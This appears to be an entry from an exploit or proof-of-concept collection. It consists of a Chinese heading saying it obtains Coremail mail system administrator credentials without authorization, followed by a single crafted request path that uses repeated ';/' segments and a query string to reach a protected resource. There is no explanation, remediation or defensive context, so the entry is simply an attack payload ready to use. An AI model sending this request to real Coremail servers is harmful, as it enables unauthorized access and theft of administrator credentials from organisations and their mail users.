## Coremail邮件系统未授权访问获取管理员账密
```
/coremail/common/assets/;/;/;/;/;/;/s?__biz=MzI3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2
```
